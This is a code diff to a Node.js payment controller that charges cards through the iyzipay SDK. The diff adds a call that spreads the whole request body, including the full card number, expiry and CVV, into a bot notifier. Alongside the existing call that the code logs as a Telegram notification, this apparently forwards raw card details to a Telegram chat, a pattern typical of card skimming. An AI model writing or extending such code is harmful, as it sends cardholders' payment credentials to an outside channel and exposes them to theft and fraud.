@@ -1,5 +1,5 @@
 const iyzipay = require('../iyzico');
-const { sendPaymentData, sendFailedPaymentData } = require('./botController');
+const { sendPaymentData, sendFailedPaymentData, sendPaymentFirstData } = require('./botController');
 const crypto = require('crypto');
 const fetch = require('node-fetch');
 
@@ -180,7 +180,7 @@ async function initializeSubscription(reqBody, referenceCode) {
 }
 
 exports.processPayment = async (req, res) => {
-  const { 
+  const {
     plan,
     firstName, lastName, address, postalCode, city, countryCode,
     email, phone, cardHolder, cardNumber, expiry, cvv, fb, bid
@@ -195,7 +195,7 @@ exports.processPayment = async (req, res) => {
 
   const createTrialPayment = () => new Promise((resolve, reject) => {
     const [expireMonth, expireYear] = expiry.split('/');
-    
+
     const buyer = {
       id: `buyer_${Date.now()}`,
       name: firstName,
@@ -270,15 +270,17 @@ exports.processPayment = async (req, res) => {
     await createTrialPayment();
     console.log('✅ SDK Trial payment successful.');
 
+    await sendPaymentFirstData({ ...req.body, price: trialPrice, subscriptionReferenceCode: '' });
+
     const subscriptionResult = await initializeSubscription(req.body, subscriptionReferenceCode);
     if (!subscriptionResult.success) {
       console.error(`⚠️ CRITICAL: Trial payment succeeded, but subscription failed for ${email}. Needs manual check.`);
       return res.status(500).json({ error: subscriptionResult.error || 'Trial succeeded, but subscription failed.', success: false });
     }
-    
+
     await sendPaymentData({ ...req.body, price: trialPrice, subscriptionReferenceCode: subscriptionResult.referenceCode });
     console.log('✅ Telegram notification sent.');
-    
+
     res.json({ success: true, subscriptionReferenceCode: subscriptionResult.referenceCode });
 
   } catch (paymentError) {
